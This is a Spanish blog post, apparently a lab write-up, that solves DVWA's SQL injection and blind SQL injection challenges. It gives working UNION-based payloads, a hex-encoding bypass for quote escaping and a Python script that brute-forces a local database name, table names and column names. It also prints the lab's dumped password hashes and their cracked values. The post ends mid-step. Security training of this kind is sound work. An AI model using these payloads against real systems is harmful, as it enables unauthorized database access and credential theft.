---
layout: single
title: Laboratorios de DVWA inyecciones SQL - SQLi
excerpt: "En este post explicaremos como resolver los retos de inyecciones SQL, del laboratorio de pruebas DVWA, DVWA contiene una serie de niveles para practicar vulnerabilidades web, pero nos vamos a centrar en las inyecciones SQL."
date: 2023-02-05
classes: wide
header:
  teaser: /assets/images/DVWA-SQLi/dvwa.jpg
  teaser_home_page: true
#  icon: /assets/images/hackthebox.webp
categories:
  - vulnerabilidad web
tags:  
  - mysql
  - SQLi
  - DVWA
  - SQLiBlind
---

<br>

**Indice de contenido**

- [Inyeccion SQL - Easy](#id1)
- [Inyeccion SQL - Medium](#id2)
- [Inyeccion SQL - High](#id3)
- [Inyeccion SQL Blind - Easy](#id4)
- [Inyeccion SQL Blind - Medium](#id5)
- [Inyeccion SQL Blind - High](#id6)

<div id='id1' />

# Inyección SQL - Nivel fácil

Cuando hayamos montado el sistema de práctica DVWA, podremos acceder y ver un menú con diferentes vulnerabilidades, en este caso haremos las de tipo SQLi.

El nivel fácil de inyección SQL normal se ve así:

![Inicio](/assets/images/DVWA-SQLi/SQLi-easy/inicio.png)

Vemos que tiene un apartado para ingresar datos, probaremos poner algún valor, en este caso el valor 1:

![1](/assets/images/DVWA-SQLi/SQLi-easy/id1.png)

Podemos apreciar que nos muestra que existe un usuario con el id 1, en este caso ese usuario es admin.

Probamos más números y nos dimos cuenta de que existe hasta el usuario 5.

![5](/assets/images/DVWA-SQLi/SQLi-easy/id5.png)

Vemos que este último usuario tiene de nombre Bob Smith.

<br>

Y cuando no existe un usuario, por ejemplo 6:

![6](/assets/images/DVWA-SQLi/SQLi-easy/id6.png)

Simplemente no nos muestra nada en caso de que el id de usuario no exista.

Ahora probaremos romper la consulta, como sabemos lo haremos con una comilla simple:

`1'`

De esta forma, y al tramitar este dato nos arroja el siguiente error:

![error](/assets/images/DVWA-SQLi/SQLi-easy/error.png)

Lo cual nos comienza a surgir ideas de que es vulnerable a SQLi, ya que nos marcó error directo de la base de datos.

Ahora intentaremos inyectar esta consulta:

`1' OR 1=1 -- -`

Y vemos que nos devuelve lo siguiente:

![users](/assets/images/DVWA-SQLi/SQLi-easy/allusers.png)

Podemos apreciar que nos interpretó nuestra consulta, nos escapó del campo User ID, y inyecto nuestra consulta que en este caso es OR 1=1, lo que hará que veamos todos los usuarios, ya que estamos comentando el resto de la consulta existente evitando limits o algo similar.

<br>

Ahora intentaremos descubrir cuantas columnas se están devolviendo a la respuesta del servidor web, en este caso sabemos que hay 2 campos, **First name** y **Surname**.

Por lo que intuimos que se devuelven 2 columnas, y esto lo verificaremos con **ORDER BY**:

`1' ORDER BY 2 -- -`

Y vemos esta respuesta:

![order2](/assets/images/DVWA-SQLi/SQLi-easy/orderby2.png)

Vemos que nos responde con algo, y sabemos que son 2 columnas las que se devuelven, ya que de lo contrario si ponemos un valor mayor que 2 nos dará este error:

![order3](/assets/images/DVWA-SQLi/SQLi-easy/orderby3.png)

Así que ya sabemos que son 2 columnas devueltas, ahora averiguaremos que tipo de dato está devolviendo, como en la respuesta vimos sabemos que está devolviendo strings, o sea texto, por lo que haremos esta consulta para verificarlo:

`1' UNION SELECT 'texto1','texto2' -- -`

Y como sospechábamos, si eran datos de texto los que devolvía estas columnas:

![strings](/assets/images/DVWA-SQLi/SQLi-easy/strings.png)

Podemos ver que se agregan las etiquetas 'texto1' y 'texto2' en lugar de sus valores por defecto.

<br>

Ahora intentaremos enumerar los nombres de bases de datos existentes, por lo que haremos la siguiente consulta:

`1' UNION SELECT schema_name, NULL FROM information_schema.schemata -- -`

Y podemos ver que nos enumera las bases de datos existentes:

![db](/assets/images/DVWA-SQLi/SQLi-easy/databases.png)

Y vemos que nos enumeró 2 bases de datos:

- information_schema
- dvwa

Sabemos que la base de datos information_schema es una por defecto que siempre viene y de ahí es donde enumeramos el resto, por lo que aparte de esa por defecto, vemos una que nos llama la atención, llamada dvwa.

Así que enumeraremos las tablas existentes dentro de esa base de datos:

`1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'dvwa' -- -`

![tables](/assets/images/DVWA-SQLi/SQLi-easy/tables.png)

Vemos que nos enumeró 2 tablas:

- users
- guestbook

Así que enumeraremos las columnas de la tabla **users**, con esta nueva consulta:

`1' UNION SELECT GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_schema = 'dvwa' AND table_name = 'users' -- -`

Esta vez usamos la función GROUP_CONCAT() para que nos sea más fácil ver las columnas sin que se muestre tanto texto, así que nos respondió esto:

![columns](/assets/images/DVWA-SQLi/SQLi-easy/columns.png)

Vemos que nos enumeró las columnas de la tabla **users** y estas columnas son:

- user_id
- first_name
- last_name
- user
- password
- avatar
- last_login
- failed_login

Vemos muchas columnas, pero las que nos llaman la atención son **user** y **password**, por lo que procederemos a enumerarlas:

`1' UNION SELECT GROUP_CONCAT(user,':',password), NULL FROM dvwa.users -- -`

![data](/assets/images/DVWA-SQLi/SQLi-easy/data.png)

Podemos ver que nos enumeró el usuario y password, agregando el caracter : para separar ambas cosas.

Podemos ver que nos dumpeo estos datos:

- admin:5f4dcc3b5aa765d61d8327deb882cf99
- gordonb:e99a18c428cb38d5f260853678922e03
- 1337:8d3533d75ae2c3966d7e0d4fcc69216b
- pablo:0d107d09f5bbe40cade3de5c71e9e9b7
- smithy:5f4dcc3b5aa765d61d8327deb882cf99

Pero vemos que las contraseñas están hasheadas, por lo que intentaremos crackearlas.

En el sitio [CrackStation](https://crackstation.net) podemos crackear hashes básicos, como este es un nivel fácil, los hashes no deben ser complejos así que podemos tirar de esta web, y crackearlos:

![hashcrack](/assets/images/DVWA-SQLi/SQLi-easy/hashcrack.png)

Y como vemos nos ha crackeado todas las contraseñas de cada usuario:

- password
- abc123
- charley
- letmein
- password

Así que hemos completado el nivel fácil de este laboratorio.

<br>

<div id='id2' />

# Inyección SQL - Nivel intermedio

Una vez seleccionado el nivel intermedio de dificultad vamos al apartado de SQLi, y veremos lo siguiente:

![medium](/assets/images/DVWA-SQLi/SQLi-medium/medium.png)

Ahora vemos que ha cambiado, ya no es un campo donde ingreses datos, sino que ahora es para seleccionar ya el dato.

Esto nos limita probar si es vulnerable a inyecciones SQL, ya que no nos deja ingresar texto directamente, pero lo que podemos hacer es optar por BurpSuite, e interceptar la petición, así que eso haremos.

![peticion1](/assets/images/DVWA-SQLi/SQLi-medium/peticion.png)

Como podemos ver, hemos interceptado la petición y esta la hemos pasado al repeater de burpsuite, y vemos que por el método POST se da este valor al parámetro id al seleccionar algún valor:

`id=1&Submit=Submit`

Y en la parte derecha vemos la respuesta.

Así que desde aquí intentaremos romper primeramente la consulta, quedando el valor id así:

`id=1&Submit=Submit`

Y vemos que nos responde esto:

![error](/assets/images/DVWA-SQLi/SQLi-medium/error.png)

El error de MariaDB SQL, por lo que ya podemos darnos la idea de que es vulnerable.

Así que ahora podremos intentar inyectar consultas, como sabemos primero contamos el número de columnas devueltas, así que usaremos ORDER BY:


`id=1 ORDER BY 2 -- -`

Como vemos en esta consulta ya no se usa la comilla para escapar de la consulta por defecto, ya que por detrás ya no se está indicando eso de '%UserID%' para obtener lo que el usuario puso en ese lugar de texto, y esto es porque ahora ya solo lo seleccionamos directamente de la lista que nos despliega.

Así que al tramitar la petición con ese parámetro modificado veremos que nos responde lo siguiente:

![order2](/assets/images/DVWA-SQLi/SQLi-medium/orderby2.png)

Podemos apreciar que no nos lanza ningún error, por lo que está interpretando nuestras consultas, probaremos indicándole en lugar de 2 un 3, para probar que responde:

`id=1 ORDER BY 3 -- -`

![order3](/assets/images/DVWA-SQLi/SQLi-medium/orderby3.png)

Podemos apreciar que nos marca un error, por lo que quiere decir que hay 2 columnas que se están devolviendo y no 3.

<br>

Ahora toca averiguar cuáles son las bases de datos existentes, por lo que haremos uso del método que ya conocemos:

`id=1 UNION SELECT GROUP_CONCAT(schema_name), NULL FROM information_schema.schemata -- -`

Y vemos que nos responde las bases de datos:

![databases](/assets/images/DVWA-SQLi/SQLi-medium/databases.png)

Y estas bases de datos son:

- information_schema
- dvwa

<br>

Como sabemos nos llama la atención la de nombre dvwa, por lo que crearemos una consulta para enumerar sus tablas:

`id=1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'dvwa' -- -`

Este método es el que usamos en este tipo de inyecciones SQL basadas en errores, pero en este caso vemos la siguiente respuesta:

![err](/assets/images/DVWA-SQLi/SQLi-medium/err.png)

Podemos apreciar que nos marca error, cosa que antes en el nivel fácil no pasaba, la consulta esta bien, pero lo que sucede es que en este nivel intermedio nos dice lo siguiente:

*"El nivel medio utiliza una forma de protección de inyección SQL, con la función de "mysql_real_escape_string()". Sin embargo, debido a que la consulta SQL no tiene comillas alrededor del parámetro, esto no protegerá completamente la consulta para que no se modifique"*

Así que como el administrador de la base de datos intento protegerla de inyecciones sql, lo que hace esa función llamada mysql_real_escape_string(), es evitar que podamos ingresar caracteres como comillas, o comillas dobles, pero como no está bien protegida podemos hacer bypass usando codificación hexadecimal.

<br>

Lo que haremos es cambiar el texto de dvwa por ese texto, pero codificado en hexadecimal, lo haremos con un traductor o como quieras, y nos quedara así:

64,76,77,61

Simplemente eliminamos las comillas quedándonos con 64767761, y le agregamos un 0x para decirle que es valor hexadecimal, quedando la consulta así:

`id=1 UNION SELECT GROUP_CONCAT(table_name), NULL FROM information_schema.tables WHERE table_schema = 0x64767761 -- -`

Y ya nos responde las tablas de la base de datos dvwa:

![tab](/assets/images/DVWA-SQLi/SQLi-medium/tables.png)

Vemos que nos dumpeo las tablas:

- users
- guestbook

<br>

Ahora enumeraremos las columnas de la tabla users, ya que es la que nos llama la atención.

`id=1 UNION SELECT GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_schema = 0x64767761 AND table_name = 0x7573657273 -- -`

Y vemos que nos responde:

![columns](/assets/images/DVWA-SQLi/SQLi-medium/columns.png)

Nos da las siguientes columnas:

- user_id
- first_name
- last_name
- user
- password
- avatar
- last
- login
- failed
- login

Y por último sacaremos los datos de las columnas user y password, ya que son las que nos llaman la atención:

`id=1 UNION SELECT GROUP_CONCAT(user,0x3a,password), NULL FROM dvwa.users -- -`

 Aquí no usamos hexadecimal, ya que no hay necesidad de usar comillas, solo en el carácter de ":" para separar el user de la password, pero fuera de eso no se usa, ya que ya sabemos donde está lo que nos interesa.

Y así veremos los usuarios y contraseñas que hemos dumpeado:

![dump](/assets/images/DVWA-SQLi/SQLi-medium/dump.png)

- admin:5f4dcc3b5aa765d61d8327deb882cf99
- gordonb:e99a18c428cb38d5f260853678922e03
- 1337:8d3533d75ae2c3966d7e0d4fcc69216b
- pablo:0d107d09f5bbe40cade3de5c71e9e9b7
- smithy:5f4dcc3b5aa765d61d8327deb882cf99

Y ya habremos terminado con este nivel intermedio.

<br>

<div id='id3' />

# Inyección SQL - Nivel dificil

En el nivel difícil podemos apreciar que en la sección de inyección SQL ya no nos aparece algún lugar donde meter los datos o seleccionarlos como lo hicimos anteriormente:

![hard](/assets/images/DVWA-SQLi/SQLi-hard/hard.png)

Podemos apreciar que solo nos da una opción que para cambiar el ID ocupamos darle click, y al hacerlo nos abrirá otra ventana:

![other](/assets/images/DVWA-SQLi/SQLi-hard/other.png)

Y vemos que en esta página que se abrió contiene un cuadro para ingresar texto, y al ingresar algo y dar en submit vemos lo siguiente:

![submit](/assets/images/DVWA-SQLi/SQLi-hard/submit.png)

Vemos que nos mandó ese valor a la otra página, suponemos que esta data se está tramitando por el método POST, ya que no vemos nada de valores en la URL para deducir que se está tramitando por GET, así que abriremos el BurpSuite e interceptaremos la petición anterior:

![i1](/assets/images/DVWA-SQLi/SQLi-hard/intercept.png)

Como vemos se está tramitando por el método POST, así que ahora intentaremos romper la consulta para ver que nos responde, esta vez no usaremos el repeater, ya que queremos trabajar con la petición actual, ya que el resultado que nos interesa se verá reflejado en la web principal y no la que se abre, así que modificaremos la petición en el intercept del proxy, quedándonos así:

`id=1' OR 1=1 -- -`

![i2](/assets/images/DVWA-SQLi/SQLi-hard/intercept2.png)

Y esto nos responde al tramitar la petición:

![r1](/assets/images/DVWA-SQLi/SQLi-hard/respuesta1.png)

Vemos que nos dumpea todos los usuarios, omitiendo algún limit por detrás que quedo comentado, así que comprobamos que es vulnerable y empezaremos a averiguar cuantas tablas se están devolviendo usando como ya sabemos ORDER BY:

`1' ORDER BY 2-- -`

![orderby2](/assets/images/DVWA-SQLi/SQLi-hard/orderby2.png)

Y vemos que nos responde:

![r2](/assets/images/DVWA-SQLi/SQLi-hard/respuesta2.png)

Y vemos que nos responde sin error, ya que como sabemos en esta base de datos solo hay 2 columnas que se devuelven, ya que la base de datos es la misma lo que cambia es la forma de vulnerabilidad.

Así que ya sabemos que tiene 2 columnas que devuelve, por lo que ahora enumeraremos las bases de datos:

`id=1' UNION SELECT GROUP_CONCAT(schema_name), NULL FROM information_schema.schemata -- -`

![intercept3](/assets/images/DVWA-SQLi/SQLi-hard/intercept3.png)

Y vemos que nos responde:

![db](/assets/images/DVWA-SQLi/SQLi-hard/databases.png)

Podemos ver que nos lista 2 bases de datos:

- information_schema
- dvwa

Como ya sabemos ahora enumeraremos las tablas de dvwa:

`id=1' UNION SELECT GROUP_CONCAT(table_name), NULL FROM information_schema.tables WHERE table_schema = 0x64767761 -- -`

> Recordemos que se está usando un filtro para evitar inyecciones, pero no está bien adaptada, por lo que podemos evadir el filtro de comillas usando hexadecimal.

![i4](/assets/images/DVWA-SQLi/SQLi-hard/intercept4.png)

Y vemos que nos responde:

![r4](/assets/images/DVWA-SQLi/SQLi-hard/respuesta4.png)

Así que ya tenemos las tablas:

- users
- guestbook

<br>

Ahora enumeraremos las columnas de estas tablas, usando la siguiente consulta:

`id=1' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_schema = 0x64767761 AND table_name = 0x7573657273 -- -`

![i5](/assets/images/DVWA-SQLi/SQLi-hard/intercept5.png)

Y vemos que nos responde:

![r5](/assets/images/DVWA-SQLi/SQLi-hard/respuesta5.png)

Así que tenemos las columnas:

- user_id
- first_name
- last_name
- user
- password
- avatar
- last_login
- failed_login

<br>

Y por último dumpearemos los datos de las columnas que nos interesan, en este caso como sabemos user y password:

`id=1' UNION SELECT GROUP_CONCAT(user,'0x3a',password), NULL FROM dvwa.users -- -`

![i6](/assets/images/DVWA-SQLi/SQLi-hard/intercept6.png)

Esta consulta nos responderá:

![r6](/assets/images/DVWA-SQLi/SQLi-hard/respuesta6.png)

Y tenemos todos los usuarios y password dumpeados:

- admin:5f4dcc3b5aa765d61d8327deb882cf99
- gordonb:e99a18c428cb38d5f260853678922e03
- 1337:8d3533d75ae2c3966d7e0d4fcc69216b
- pablo:0d107d09f5bbe40cade3de5c71e9e9b7
- smithy:5f4dcc3b5aa765d61d8327deb882cf99

<br>

En este punto pasaremos a los niveles de las inyecciones SQL Blid.

<br>

<div id='id4' />

# Inyección SQL Blind (ciega) - Nivel Fácil

En este desafío de SQL Blind podemos apreciar que al ingresar un valor en el campo que nos pide un valor vemos que en caso de que el id que dimos exista nos va a responder lo siguiente:

![exist](/assets/images/DVWA-SQLi/SQLiBlind-easy/exist.png)

Nos responde el mensaje "User ID exists in the database.", y en caso de que el valor id no exista nos devuelve el mensaje:

![missing](/assets/images/DVWA-SQLi/SQLiBlind-easy/missing.png)

"User ID is MISSING from the database."

Pero al parecer no nos está devolviendo ninguna columna, ya que no vemos algo más allá de eso, pero tenemos en cuenta que ya hay 2 posibilidades de respuesta, el exist y missing, algo como un verdadero y falso, ahora trataremos de buscar si es vulnerable a inyecciones SQL.

Primero interceptaremos una petición y de id le daremos un valor que sea Missing o sea que no exista algo así como un false, así que por ejemplo sabemos que solo hay 5 usuarios, así que le pasaremos un 22:

![22](/assets/images/DVWA-SQLi/SQLiBlind-easy/22.png)

Podemos apreciar que nos responde un User ID is "MISSING from the database.", ahora intentaremos inyectar el OR 1=1, escapando del campo del ID y inyectando esto y en teoría si es vulnerable de esta forma deberemos ver algo como que el usuario existe, ya que está validando el OR y no lo primero.

Así que al hacer esta consulta:

`id=22' OR 1=1 -- -`

Vemos que nos arroja el siguiente error:

![err](/assets/images/DVWA-SQLi/SQLiBlind-easy/error.png)

Y esto puede deberse a que no lo estamos poniendo en formato URL, así que seleccionaremos nuestra consulta y cuando la seleccionemos toda pulsaremos ctrl + u para url-encodearlo y nos quedará así:

![url](/assets/images/DVWA-SQLi/SQLiBlind-easy/urlencode.png)

> Este formato es el que agrega un navegador para que el servidor logre interpretarlo sin errores, pero como estamos desde burp debemos hacerlo manualmente.

Al tramitar la petición en este formato podemos apreciar que ya nos responde correctamente:

![exist2](/assets/images/DVWA-SQLi/SQLiBlind-easy/exist2.png)

Sabemos que es vulnerable, ya que nos marca como Existente un ID que no era válido, y sabemos esto, ya que la consulta ha tomado el valor inyectado del OR, y con esto podremos hacer muchas cosas, hasta enumerar datos con esta vulnerabilidad SQLi basada en respuestas condicionales.

<br>

Primero intentaremos enumerar las bases de datos, como esta vulnerabilidad es ciega y solo tendremos respuestas condicionales que en base a ello sabremos si la consulta devuelve un true o false, lo que haremos primero es saber la longitud del nombre de la base de datos actual:

`1' AND (SELECT LENGTH(database()))=4 -- -`

> Hay veces que varía entre usar el OR o el AND, ya que alguno puede responder bien y otro no, es algo de ir probando.

En esta consulta estamos indicándole que nos tome el valor de la longitud de la base de datos actual y la compare con el valor 4.

![length](/assets/images/DVWA-SQLi/SQLiBlind-easy/length.png)

Y podemos apreciar que nos responde "User ID exist in the database.", por lo que podemos asumir que el tamaño de longitud de la base de datos actual es 4, esto de **d** **v** **w** **a**, pero en un entorno real tendremos que probar con operadores mayor o menor para llegar al tamaño, en este caso sabemos que es 4 y esto para ahorrar tiempo ya sabemos que la base de datos actual es dvwa y por eso nos responde la respuesta true.

No esta de más probar otro dígito incorrecto para ver que la lógica funcione y no nos esté dando un falso positivo:

`1' AND (SELECT LENGTH(database()))=55 -- -`

En este caso pusimos el valor 55, el cual sabemos que debe retornarnos falso:

![false](/assets/images/DVWA-SQLi/SQLiBlind-easy/false.png)

Y podemos apreciar que así es, por lo que ya sabemos que la lógica de la inyección está funcionando y podemos continuar.

<br>

En este punto, lo siguiente es enumerar el nombre de la base de datos actual, para ello podemos crear la siguiente consulta:

`1' AND (SELECT SUBSTRING(database(),1,1))='a' -- -`

Con esto le estamos indicando que nos seleccione el valor que devuelve la función SUBSTRING(), en este caso nos estará devolviendo el primer valor del nombre de la base de datos, y al final de la consulta comprobamos si ese valor es igual al carácter "a".

Como sabemos en caso de ser cierto nos devolverá:

User ID exists in the database.

Y en caso de ser falso:

User ID is MISSING from the database.

Y la respuesta de esa consulta anterior es la siguiente:

![dba](/assets/images/DVWA-SQLi/SQLiBlind-easy/database_a.png)

Podemos ver que nos dice el valor false, por lo que el primer carácter de la base de datos actual no es "a", ahora probaremos con "d":

`1' AND (SELECT SUBSTRING(database(),1,1))='d' -- -`

![dbd](/assets/images/DVWA-SQLi/SQLiBlind-easy/database_d.png)

Y vemos que nos responde la respuesta verdadera, por lo que ya sabemos que inicia con la letra "d".

En este punto tendríamos que ir recorriendo el valor de la función SUBSTRING() para ir enumerando los siguientes caracteres, pero como esto es tardado manualmente, haremos un script para que nos automatice el fuzzing.

```python

#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#CTRL+C
signal.signal(signal.SIGINT, def_handler)

main_url = "http://localhost/DVWA/vulnerabilities/sqli_blind/"
characters = string.ascii_lowercase + string.digits + "-_:@!$%&()*+/;<=>?[\]^{|}.~"

def makeRequest():
    
    database = ""

    p1 = log.progress("Enumerar base de datos")
    p1.status("Iniciando ataque de fuerza bruta para enumerar el nombre de la base de datos actual")

    time.sleep(2)

    p2 = log.progress("database name")

    for position in range(1,5):

        for character in characters:
            url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(database(),%d,1))='%s'+--+-&Submit=Submit" % (position, character)

            cookies = {
                'PHPSESSID': "2nn0125e6gmk861ht73vfl74p0",
                'security': "low"
            }
            
            p1.status(url)

            r = requests.get(url, cookies=cookies)

            if "User ID exists in the database." in r.text:
                database += character
                p2.status(database)
                break

if __name__ == '__main__':

    makeRequest()

```

Este script es similar al que usamos en post anteriores, solamente cambian algunas cosas, por ejemplo cuando usamos este script anteriormente en otro post la vulnerabilidad estaba en el campo de la cookie, pero en este caso la vulnerabilidad esta directamente en el parámetro id que se tramita por el método GET.

`characters = string.ascii_lowercase + string.digits + "-_:@!$%&()*+/;<=>?[\]^{|}.~"`

Aquí estamos agregando algunos dígitos especiales como guion bajo o símbolos que podrían venir en el nombre de la tabla.

> Estos no son todos los símbolos especiales existentes, pero son los comunes.

`for position in range(1,5):`

En el primer for estamos creando un ciclo que se repetirá 4 veces, recuerda que en programación se inicia desde el 0 por lo que tendremos que poner que termine en 5.

Esto se repetirá 4 veces, ya que la longitud del nombre de la base de datos es 4.

`for character in characters:`

En el siguiente for obtendremos cada carácter que esté en la variable characters que declaramos anteriormente, esto irá iterando sobre cada posición de esa variable.

Para después en cada iteración ejecutar lo siguiente.

Primero crear una variable llamada url con la siguiente consulta:


`1' AND (SELECT SUBSTRING(database(),1,1)='a' -- -`

Pero la pondremos url encodeada y también asignarle en los valores que iran cambiando para fuzzear.

```py
url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(database(),%d,1))='%s'+--+-&Submit=Submit" % (position, character)
```

Quedándonos así, en el %d irán iterando las posiciones de cada carácter de la base de datos, y en el %s irá el valor actual de la variable character que creamos con el for.

Después de asignar la consulta nos toca declarar los valores de la cookie:

```python
cookies = {
	'PHPSESSID': "2nn0125e6gmk861ht73vfl74p0",
	'security': "low"
}
```

Agregamos los valores que sacamos de burpsuite para poder hacer correctamente la petición.

Después haremos dicha petición por el método GET, la petición se hará al valor que está en nuestra consulta que construimos usando las cookies que creamos.

`r = requests.get(url, cookies=cookies)`

Por último comprobaremos si la petición actual nos respondió algo verdadero o no, por lo que le diremos que si el texto "User ID exists in the database." Está dentro de la respuesta de la petición entonces en caso de ser cierto pasaremos a agregar el carácter que se está probando actualmente a la variable database sin reemplazar las que ya había.

```python
if "User ID exists in the database." in r.text:
	database += character
	p2.status(database)
	break
```

Por último salimos del for, ya que hemos encontrado el carácter correcto, y al salir se iterara la siguiente posición del nombre de la base de datos, y así seguirá hasta terminar de recorrer los 4 espacios.

Una vez ejecutemos el script veremos que nos dumpea el nombre de la base de datos:

![namedb](/assets/images/DVWA-SQLi/SQLiBlind-easy/namedatabase.png)

Y vemos que la base de datos se llama "dvwa".

Lo siguiente que haremos es enumerar las tablas de esta base de datos, pero primero ocupamos saber cuantas tablas existen, para ello usaremos la siguiente consulta:

`1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'dvwa')=2 -- -`

Le estamos diciendo que nos cuente el número de tablas dentro de information_schema.tables, Donde el valor de table_schema o sea el nombre de la base de datos sea "dvwa", y con ese valor devuelto lo compararemos con el número 2.

Y vemos que esto nos responde lo siguiente:

![count](/assets/images/DVWA-SQLi/SQLiBlind-easy/count.png)

Podemos apreciar que nos responde el mensaje "User ID exists in the database.", por lo que podemos pensar que hay 2 tablas, probaremos con el valor 3 para ver que todo tenga lógica y nos debería dar error:

`1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'dvwa')=3 -- -`

![count3](/assets/images/DVWA-SQLi/SQLiBlind-easy/count3.png)

Como vemos nos da error, por lo que sabemos que entonces hay 2 tablas y no más o menos.

<br>

Ahora que sabemos que hay 2 tablas, tendremos que determinar la longitud de cada tabla, para ello usaremos:

`1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa' LIMIT 1)>=5 -- -`

En esta consulta le estamos indicando que nos seleccione la longitud de la tabla, la cual esta tabla la obtendremos de information_schema.tables, donde el nombre de la base de datos sea "dvwa" y limitando a 1 resultado para evitar errores, e ir en orden, y este valor lo compararemos con un valor, en este caso le diremos que si ese valor es mayor o igual a 5, y vemos que nos responde:

![>=5](/assets/images/DVWA-SQLi/SQLiBlind-easy/>=5.png)

Podemos ver que nos responde la respuesta True, por lo que podemos saber que la longitud de la primera tabla es igual o mayor a 5, para probar quitaremos el mayor y dejaremos solo el igual para ver si nos responde true o false, en caso de True sabremos que el valor de la longitud de la primera tabla es 5, y en caso de false quiere decir que es más de 5.

Y vemos que nos responde:

![=5](/assets/images/DVWA-SQLi/SQLiBlind-easy/igual5.png)

Apreciamos que nos responde True, por lo que el tamaño de la longitud de la primera tabla es 5.

<br>

Haremos lo mismo, pero esta vez para la segunda tabla, para ello usaremos la consulta anterior pero esta vez cambiando el limit:

`1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa' LIMIT 1,1)=5 -- -`

Decimos que el valor de la longitud de la segunda tabla nos lo compare con el valor mayor o igual a 5.

Y vemos que nos responde:

![=5](/assets/images/DVWA-SQLi/SQLiBlind-easy/>=5XD.png)

Podemos apreciar que nos da el valor true, por lo que quitamos el operador de mayor, y ejecutamos esto, pero nos devolvió un estado false, por lo que intentamos con una cantidad más alta, en este caso 10:

`1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa' LIMIT 1,1)=10 -- -`

![false2](/assets/images/DVWA-SQLi/SQLiBlind-easy/false2.png)

Y vemos que nos responde un valor False, por lo que podemos pensar que el valor es mayor de 5 y menor de 10, aquí probaremos con algún valor entre ese rango, por ejemplo 8:

`1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa' LIMIT 1,1)=8 -- -`

![true2](/assets/images/DVWA-SQLi/SQLiBlind-easy/true2.png)

Vemos que nos devuelve el valor True, por lo que ahora probaremos sin el operador de mayor y ver que responde:

`1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa' LIMIT 1,1)=8 -- -`

Nos da error esta consulta, pero probamos con el siguiente valor cercano a ese rango que es 9:

`1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa' LIMIT 1,1)=9 -- -`

Y esta vez vemos que nos devuelve True:

![longitud](/assets/images/DVWA-SQLi/SQLiBlind-easy/longitud.png)

Así que ya sabemos que el tamaño de longitud de la segunda tabla es 9.

<br>

En este punto nos tocaría enumerar los nombres de dichas tablas empezando por la primera, para ello usaremos el mismo script, pero esta vez cambiaremos los mensajes que se muestran en pantalla, y lo más importante cambiar la consulta de la variable url y las veces que se repetirá el ciclo.

Primero, el primer for quedará así:

`for position in range(1,6):`

Ya que la longitud del nombre de la primera tabla recordamos que es 5, por lo que este ciclo se repetirá una vez por carácter y el siguiente for como sabemos ira fuzzeando cada valor y comprobar si ese valor es el correcto o no en base al mensaje de respuesta.

Lo siguiente a modificar fue la consulta de la variable URL que está dentro del for anidado:

La consulta normal es:

1' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema = 'dvwa' limit 1)='a' -- -

Pero adaptarlo al codigo de python y url-encodeado quedaría así dentro de la variable url:

```py
url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(table_name,%d,1)+FROM+information_schema.tables+WHERE+table_schema+='dvwa'+limit+1)='%s'+--+-&Submit=Submit" % (position, character)
```

Y también agregando los valores que irán fuzzeando las posiciones y caracteres.

> Hay otros valores que también deben cambiarse, pero no los mostre, ya que es lógico cambiar el nombre de los mensajes que vemos en pantalla.

Y al ejecutar el script podemos apreciar que recibiremos el nombre de la primera tabla:

![users](/assets/images/DVWA-SQLi/SQLiBlind-easy/users.png)

Ahora descubrimos que la primera tabla se llama users.

<br>

Para descubrir el nombre de la segunda tabla es similar solo cambiaremos obviamente el primer for de posiciones que en este caso no será 5 sino 9:

`for position in range(1,10):`

Y de la variable URL donde se almacena la consulta que se probará para fuzzear cada posición solo debemos cambiar el limit:

```py
url = "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'+AND+(SELECT+SUBSTRING(table_name,%d,1)+FROM+information_schema.tables+WHERE+table_schema+='dvwa'+limit+1,1)='%s'+--+-&Submit=Submit" % (position, character)
```

Al ejecutar el script veremos el nombre de la segunda tabla:

![guestbook](/assets/images/DVWA-SQLi/SQLiBlind-easy/guestbook.png)

Vemos que la segunda tabla se llama guestbook.

<br>

Ahora tenemos las 2 tablas:

- users
- guestbook

La que nos llama la atención es "users", por lo que ahora toca enumerar sus columnas.

Para ello, primero debemos 

`1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = 'dvwa' AND table_name = 'users')>=5 -- -`

Con esta consulta estamos tomando el valor de cuantas columnas existen dentro de la base de datos dvwa donde el nombre de la tabla sea "users", y este valor lo compararemos con mayor o igual a 5.

Esto nos responde:

![existcolumn](/assets/images/DVWA-SQLi/SQLiBlind-easy/existcolumn.png)

El valor True, por lo que ya sabemos que hay que hacer, ir jugando hasta que el igual nos dé el valor exacto, para ahorrar esto no describiremos el proceso que ya sabemos hacer, por lo que al intentar descubrimos que existen 8 columnas.

Tendremos que averiguar la longitud del nombre de cada una de ellas, o también podríamos hacerlo sin la longitud e intuir hasta cuando termina el nombre de una columna.

Por ejemplo, ahora que lo haremos sin las longitudes, lo que haremos será lo siguiente:

`1' AND (SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns WHERE table_schema = 'dvwa' AND table_name = 'users' limit 1)='a' -- -`

Con esta consulta nos sirve para enumerar los nombre de las columnas, empezando por la primera, esto lo adaptaremos al script para enumerar datos, en este caso enumeraremos los nombres de las columnas:

Como esta vez no tenemos un aproximado de longitud para decirle al script cuando detenerse pondremos un 50 en el primer for:

